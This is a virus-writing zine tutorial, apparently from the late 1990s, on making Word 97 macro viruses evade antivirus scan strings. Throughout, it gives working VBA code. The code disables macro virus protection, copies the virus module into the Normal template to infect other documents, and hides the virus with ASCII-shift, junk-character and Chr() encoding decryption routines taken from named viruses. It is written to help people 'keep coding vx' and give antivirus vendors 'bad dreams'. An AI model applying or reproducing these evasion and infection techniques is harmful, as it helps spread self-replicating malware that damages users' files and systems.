    Hmmm...why use tricks to make your macro unscannable? Simple, you are
working a new macro very hard for a long time, finished it and start an
AV to check...and finally it got detected...damn what a shitty thing right?
Here I will show you a few technics to make your virus undetectable for a 
while...
</P>
<P align="center"> <b>-How to avoid 'scan strings'- </b></P>
<P>
    Scan strings are strings which the AV looks for. This can be specific
commands like 'Options.Virusprotection = False' and so. Ok, look now at 
the following examples...

</P><PRE>
    Options.Virusprotection = False
    Options.SaveNormalPrompt = False
</PRE><P>

    This are common commands for a macro virus, but AV scan exactly for 
this commands, so what can we do to avoid detection? The answer is simple.
Just replace the 'False' with '(Rnd * 0)' or something like that.

</P><PRE>
    Options.Virusprotection = (Rnd * 0)
    Options.SaveNormalPrompt = (Rnd * 0)
</PRE><P>    

    In case of F/Win32, the scanner doesn't detect a turning off of this
option. Next the AV look for things like object variables. Common object
is for example:

</P><PRE>
    Set Norm = NormalTemplate.VBProject.VBComponents(1).CodeModule
</PRE><P>

    This will also be specific for a virus, but what if we write this 
here a bit changed like:

</P><PRE>
    Set a = Normaltemplate: Set b = a.VBProject
    Set c = b.VBComponents(1): Set d = c.CodeModule
</PRE><P>

    This one will confuse the AV, coz it only knows the code of the first
line. Next we will look at the copymethods. The common methods are import
and export. So take a sample...
</P><PRE>
   ActiveDocument.VBProject.VBComponents("DUAL").Export "c:\dual.sys"

   ....

   Normaltemplate.VBProject.VBComponents.Import "c:\dual.sys"
</PRE><P>
   This is again common virus code. You could change this lines to the
following.
</P><PRE>
   viruscode = ActiveDocument.VBProject.VBComponents("DUAL") _
               .Lines(1,20)

   Open "c:\dual.sys" for output as #1
   	Print #1, "Attribute VB_Name = ""dual"""
        Print #1, viruscode
   Close #1

   ....

   Normaltemplate.VBProject.VBComponents.Import "c:\dual.sys"
</PRE><P>
   This is only one method, another would be the AMI technic which can
also be found here in this zine. I will show here a sample code. This
method has nothing to do with these shown before. It adds a modul to
the document/template and inserts then it's virulant code.
</P><PRE>
    If NormalIns_ = False Then
  
        VirusLength_ = Active_.VBComponents(ModulName_) _
                       .CodeModule.CountOfLines
        VirusCode_ = Active_.VBComponents(ModulName_) _
                     .CodeModule.Lines(1, VirusLength_)
 
        Normal_.VBComponents.Add (vbext_ct_StdModule)
        Normal_.VBComponents((NormalComp_ + 1)).Name = ModulName_  
        Normal_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_
        
    End If
</PRE><P>      

    Finally I think there can be done a lot more in how 2 avoid scan strings
but I think this is enough for the moment. If you find something else you
could avoid, feel free and contact me about this technic.

<P align="center"> <b>-Use encryption-</b></P>
<P>
    Wow...encryption what a great technic! But it's a bit complicated in VBA
like you will see, but no the big problem. One problem is that when you en-
crypt your code and add it, you have to run the sub again so that this code
works. It's a bit complicated to explain for me coz english is not my mother-
language ;). Take a look at this...

</P>
<blockquote>
  <PRE>
Sub AutoOpen()

    ---------------------
   | Code for decryption |     &lt;-- This code decrypts the encrypted code
    ---------------------

    ---------------------
   |   A call for the    |     &lt;-- You need to call the external sub

End Sub
   
Sub DecryptedCodeHere()
                               &lt;-- The decrypted code takes place here
End Sub
</PRE>

<P> I hope this little graphic will explain what I mean a bit. Fact is that you 
  have to insert the virulant code into an external sub and make a call for this 
  external sub. So now let us look at the encryption methods. There are four methods 
  I know of. For the first three this method shown in the graphic above is used. 
  For the fourth not. Ok now what methods are there... The examples will only 
  be a small part of the whole code, so look at the whole source to understand 
  what I mean... </P>
<ol>
  <li> Take a string, read out it's ascii numbers and add for example 3 to it. 
    If you have the string 'ABC' then it would be 'DEF'. </li>
  <li> Use some kind of Xor encryption. I won't explain this here coz there is 
    a really great article about it in <a href="ezines1.htm#CODE">Codebreakers 
    #5</a>. Get it! </li>
  <li> Take a string and add junk code between every sign, for example if we have 
    'ABC' the new string would be 'ÎÒAÒ≈¯BıC' (<b><font size="-1">CCTX: characters 
    translate incorrect in HTML</font></b>) I know that this is no real encryption 
    but it works. Enough to fake AV! </li>
</ol>
<P>
The first 3 methods need to have an external sub. The next and fourth method
doesn't need a external sub coz it is only character encryption.
</P>
<ol start="4">
  <li> Use character encryption, for example if you have the string 'ABC' again 
    the new one would be 'Chr(65) + Chr(66) + Chr(67)'. Use it without the quotes! 
  </li>
</ol>
<P>
    Now look a bit closer at this technics:
</P>
<P> <font size="+1"><b>1. Ascii exchange encryption:</b></font></P>
<P>
   For this method you use some kind of a function like this below for the
   decryption. It is taken from W97M.Optiz.D by me ;)

</P><PRE>
      Public Function DeCode(Code As String)
 
        For xy = 1 To Len(Code)

           ' Create a loop from the first til the last sign of the string

           Ascii = Asc(Mid(Code, xy, 1))

           ' Save the current ascii value of the current sign

           Change = Ascii - 29

           ' Substract 29 from it to get the real decrypted code          

           NewCode = NewCode & Chr(Change)

           ' Transform it to a character           

        Next

        ' Next sign
    
        DeCode = NewCode & vbCr

        ' Insert the decrypted code into 'DeCode'

      End Function


    All call would be...

      DeCode(MyVariable)
</PRE>
<P> If you want to have a fully commented source look at the source section under 
  'W97M.Optiz.D' or look at <a href="tumisc32.htm">Nightmare Jokers tutorial</a> 
  about encryption. Because he first used this technic... </P>
<P> <font size="+1"><b>2. Junk code encryption:</b></font></P>
<P>
   This method was first used by me I think and it is not a 'real' 
   encryption but it works pretty good. It adds to the normal string ascii
   signs higher than 177. So when it comes to decryption it only reads the
   characters which are &lt; 177. Look at the decryption function:
</P><PRE>
       Function jacky(c As String)
       
           For o = 1 To Len(c)

           ' Create a loop from the first til the last sign of the string
		
               z = Mid(c, o, 1)

               ' Get the current character...                

               If Asc(z) &gt; 177 Then z = ""

               ' Clear the string if it is &gt; 177

               x = x & z

           Next o
         
           jacky = x & vbCr

       End Function

    A call would be: 
  
       jacky(MyVariable)
</PRE><P>
    This method was first used by me. I know it's not amazing but it does 
it's work. If you want to see and example please look in the virii section
at W97M.Crypted aka W97M.Yuk. It uses this technic with AutoOpen and 
AutoClose, but take a look...

</P>
<P> <font size="+1"><b>3. Character encryption:</b></font></P>
<P> This was the first technic used in Word97. It was first used or maybe invented 
  by the great VicodinES! For this encryption you use the VBA command 'Chr()' 
  to encrypt the code. There is also a <a href="engine2.htm#VVSC">tool</a> make 
  it easier to encrypt the code. You can get the source in <a href="ezines1.htm#CODE">Codebreakers 
  #4</a>, or you can download the compiled tool on our page (if our webmaster 
  had time). Here i will explain this method a bit... </P>
<P>
   Code without hiding the strings.
</P><PRE>
       MsgBox "This is a virus"
</PRE><P>
   If someone gets into your code, this message would be obviously for a
   virus, so here's an encrypted example.
</P><P>
   Code with hiding the strings.
</P><PRE>
       MsgBox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(105) _
	 + Chr(115) + Chr(32) + Chr(97) + Chr(32) + Chr(118) + Chr(105) _
	 + Chr(114) + Chr(117) + Chr(115)
</PRE><P>
   Here we hide the obiously code in 'chr()' commands. Of course you can
combine this technics.
</P><P>

    So this were a few technics to make your macro nearly unscannable. Of
course there are more technics, but these here will help you to make AVer's
bad dreams.
</P><P>
    In the end i have to say that i won't the responsibility for any damage
someone does with this code lines. this code is for educational purpose. if
you use this code and make some damage it's your fault!!!
</P><P>
    so,hmm...what should i say? k, thanx for reading my tutorial and keep
coding vx. if you have any comments or whatever feel free to mail me.
</P><P>
have phun,
